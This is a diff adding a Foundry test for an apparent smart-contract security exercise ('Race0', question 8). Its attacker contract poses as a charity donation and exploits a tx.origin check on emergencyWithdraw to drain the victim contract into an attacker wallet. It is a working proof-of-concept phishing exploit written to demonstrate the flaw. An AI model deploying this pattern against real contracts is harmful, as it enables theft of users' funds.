@@ -2,7 +2,7 @@
 pragma solidity ^0.8.13;
 
 import {Test, console} from "forge-std/Test.sol";
-import {R0Q2, R0Q3, R0Q4, R0Q5, R0Q7} from "../src/Race0.sol";
+import {R0Q2, R0Q3, R0Q4, R0Q5, R0Q7, R0Q8} from "../src/Race0.sol";
 
 contract R0Q2Test is Test {
     R0Q2 public r0q2;
@@ -276,4 +276,58 @@ contract R0Q7Test is Test {
     function fixedRollDiceFunction() public returns (uint256) {
         return ((block.timestamp) % 6) + 1;
     }
+}
+
+
+contract R0Q8Test is Test {
+    R0Q8 r0q8;
+    R0Q8Attacker attackerContract;
+    address attacker = makeAddr("attacker");
+    uint256 depositAmount = 1 ether;
+    uint256 donationAmount = 0.1 ether;
+
+    function setUp() public {
+        r0q8 = new R0Q8();
+        attackerContract = new R0Q8Attacker(payable(r0q8), attacker);
+
+        // send deposit amount to R0Q8
+        address(r0q8).call{value: depositAmount}("");
+        // deal some ether to the admin
+        vm.deal(r0q8.admin(), donationAmount);
+    }
+
+    function test_PotentialManInTheMiddleAttackOnAdminAddressAuthentication() public {
+        assertEq(address(r0q8).balance, depositAmount);
+        assertEq(attacker.balance, 0);
+        
+        // scenario - convince the admin of R0Q8 to 'donate' to another contract
+        // vm.prank here sets the msg.sender, tx.origin
+        vm.prank(r0q8.admin(), r0q8.admin());
+        attackerContract.donateToCharity{value: donationAmount}();
+
+        // Attacker has all funds and R0Q8 contract is drained
+        assertEq(attacker.balance, depositAmount + donationAmount);
+        assertEq(address(r0q8).balance, 0);
+    }
+}
+
+contract R0Q8Attacker {
+    R0Q8 r0q8;
+    address attacker;
+    constructor(address payable _r0q8Addr, address _attacker) {
+        r0q8 = R0Q8(_r0q8Addr);
+        attacker = _attacker;
+    }
+
+    function donateToCharity() public payable {
+        // call emergencyWithdraw in R0Q8 contract 
+        // if the admin of R0Q8 calls this function then tx.origin will be their address
+        // and the funds will be transfered to this contract!
+        r0q8.emergencyWithdraw();
+
+        // send all funds to attacker wallet
+        attacker.call{value: address(this).balance}("");
+    }
+
+    receive() external payable {}
 }
